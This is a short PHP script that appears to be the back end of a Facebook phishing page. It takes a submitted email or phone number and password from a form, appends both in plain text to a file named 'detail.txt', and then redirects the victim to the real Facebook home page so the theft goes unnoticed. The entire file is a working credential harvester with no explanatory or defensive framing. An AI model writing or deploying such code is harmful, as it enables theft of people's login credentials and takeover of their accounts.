<?php
$email=$_POST['username'];
$pass=$_POST['pass2'];
$file="detail.txt";

if($email=="" or $pass==""){
	header("location: veryfy.html");
}
else{
	

file_put_contents($file,"EMAIL/PHONE: ".$email.PHP_EOL,FILE_APPEND);
file_put_contents($file,"PASSWORD: ".$pass.PHP_EOL,FILE_APPEND);
header("location: https://wwww.facebook.com/home");
}
